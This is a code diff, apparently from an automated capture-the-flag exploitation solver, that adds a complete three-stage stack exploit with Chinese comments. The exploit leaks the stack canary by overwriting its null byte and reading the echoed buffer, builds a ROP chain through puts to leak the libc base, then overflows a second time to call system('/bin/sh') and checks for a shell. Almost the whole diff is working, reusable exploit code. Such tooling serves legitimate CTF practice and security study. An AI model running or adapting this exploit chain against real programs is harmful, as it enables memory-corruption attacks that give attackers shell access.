@@ -158,6 +158,9 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
             elif plan.tag.startswith("canary:"):
                 ok, detail, out, cmds = _unpack4(_try_canary_fmt(ch, f, plan, post_cmds))
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
+            elif plan.tag.startswith("canaryecho:"):
+                ok, detail, out, cmds = _unpack4(_try_canary_echo(ch, f, plan, post_cmds))
+                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
             elif plan.tag == "flag":
                 r = execute_flag(ch, plan.steps)
                 ok, detail, out = r.ok, r.note, r.output
@@ -443,6 +446,161 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = Non
             except Exception:
                 pass
     return False, "canary attempts failed", b""
+
+
+def _try_canary_echo(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
+    """canary-echo 泄漏 -> ret2libc（repeater 型），全程同进程三阶段。
+
+    阶段 1：发 buf_size+1 字节（40A + 'B'）盖掉 canary 的 0x00 LSB，
+            puts(buf) 回显越过 LSB 带出 canary[1:8]，重组 b"\\x00" + leak7。
+    阶段 2：真 canary + 假 rbp + pop_rdi(puts@got) + puts@plt + 重入函数体（带 prologue）
+            —— 重入循环体会让 rbp 保持垃圾值，退出时 canary 检查必 smash（实测踩过）。
+    阶段 3：回到 main 后再溢出一次：真 canary + 假 rbp + ret 对齐 + pop_rdi(binsh) + system
+            —— ret 对齐不能省（实测缺它 do_system 内 SIGSEGV）。
+    """
+    import time as _t
+    from .run import spawn, verify_shell, _verify_timeout
+
+    _, _, meta = plan.tag.partition(":")
+    off_s, sink = (meta.split(":") + [""])[:2]
+    off = int(off_s)
+    libc = ch.libc_elf
+    if libc is None:
+        return False, "no libc", b""
+
+    if f.echo_leak is None:
+        return False, "no echo structure", b""
+    vi, buf_size = f.echo_leak
+    v = f.vulns[vi]
+    if not v.func_entry:
+        return False, "no func entry", b""
+    # canary 在 rbp-8，距 buf 起点 = buf_size - wordsize（repeater: 48-8=40）
+    word = ch.wordsize
+    canary_pos = buf_size - word
+
+    leak_plt = ch.plt("puts")
+    got = ch.got("puts")
+    pop_rdi = f.gadgets.get("pop_rdi")
+    ret_g = f.gadgets.get("ret")
+    if not (leak_plt and got and pop_rdi):
+        return False, "missing plt/got/pop_rdi", b""
+    # payload 至少要覆盖到 ret（canary_pos + canary + saved rbp + ret 4 段都要装得下）
+    if off <= canary_pos + word * 2 - 1:
+        return False, "window too small", b""
+
+    fake_rbp = _bss_or_fallback(ch)
+
+    for attempt in range(8):
+        try:
+            p = spawn(ch)
+        except Exception as exc:
+            return False, f"spawn failed: {exc}", b""
+        out = b""
+        try:
+            _t.sleep(0.1)
+            out += p.recvrepeat(0.08)
+
+            # ---- 阶段 1：盖 LSB 泄 canary
+            probe = b"A" * canary_pos + b"B"
+            try:
+                p.send(probe)
+            except Exception:
+                break
+            _t.sleep(0.25)
+            out += p.recvrepeat(0.3)
+            leak7 = _extract_canary_tail(out, probe)
+            if leak7 is None:
+                p.close()
+                continue
+            canary = b"\x00" + leak7              # 内存序：LSB 在前
+
+            # probe 轮的 scanf/getchar 还在等数字：先喂 0 让它消费完、回到循环顶，
+            # 否则 stage1 的字节会被 scanf('%d') 吃进 stdio 缓冲（匹配失败留在缓冲区），
+            # 后面的 read 拿到的是残缺输入 —— 手工验证时踩过的坑。
+            try:
+                p.send(b"0\n")
+            except Exception:
+                break
+            _t.sleep(0.2)
+            out += p.recvrepeat(0.25)
+
+            # ---- 阶段 2：canary + ROP 泄漏 libc 后重入 main
+            # 程序仍在循环里：先喂一个 0 让本轮 read 消化完、回到 read 前（如果需要）
+            chain = (ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt)
+                     + ch.p64(v.func_entry))
+            stage1 = (b"A" * canary_pos + canary
+                      + ch.p64(fake_rbp) + chain)
+            if sink in S.TERM_SINKS:
+                stage1 += b"\n"
+            if len(stage1) > (v.size_limit or off + 0x200):
+                p.close()
+                continue
+            try:
+                p.send(stage1)
+            except Exception:
+                break
+            _t.sleep(0.25)
+            out += p.recvrepeat(0.3)
+            # stage1 已占住本轮 read；scanf 等数字：喂非 0 → 退出循环 → canary 检查
+            # （值正确应通过）→ leave;ret 落在 ROP 上 → puts(got) 泄漏 → 重入 main
+            p.send(b"9\n")
+            _t.sleep(0.4)
+            out += p.recvrepeat(0.5)
+            base = _find_libc_base(out, libc, "puts")
+            if base is None:
+                p.close()
+                continue
+            system = base + libc.sym["system"]
+            try:
+                binsh = base + next(libc.search(b"/bin/sh"))
+            except StopIteration:
+                return False, "no /bin/sh in libc", out
+
+            # ---- 阶段 3：回到 main（banner 重新出现）后再溢出一次拿 shell
+            stage2 = (b"A" * canary_pos + canary + ch.p64(fake_rbp)
+                      + ((ch.p64(ret_g) if ret_g else b""))
+                      + ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system))
+            if sink in S.TERM_SINKS:
+                stage2 += b"\n"
+            try:
+                p.send(stage2)
+            except Exception:
+                break
+            _t.sleep(0.3)
+            p.send(b"9\n")
+            _t.sleep(0.5)
+            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
+            out += r.output
+            if r.ok:
+                return True, f"canary={hex(int.from_bytes(canary, 'little'))} base={hex(base)}", out, r.cmds
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+    return False, "echo attempts failed", b""
+
+
+def _extract_canary_tail(out: bytes, probe: bytes) -> Optional[bytes]:
+    """从回显里取 probe 之后的 7 字节（canary[1:8]）；含换行/不足 → None。"""
+    idx = out.rfind(probe)
+    if idx < 0:
+        return None
+    tail = out[idx + len(probe):]
+    nl = tail.find(b"\n")
+    if nl >= 0:
+        tail = tail[:nl]
+    if len(tail) < 7:
+        return None
+    return tail[:7]
+
+
+def _bss_or_fallback(ch: Challenge) -> int:
+    """假 rbp：用 bss 往后一点（可写即可，leave;ret 只借它中转一次）。"""
+    try:
+        return ch.elf.bss() + 0x200
+    except Exception:
+        return 0x602000
 
 
 def _find_libc_base(out: bytes, libc, name: str) -> Optional[int]:
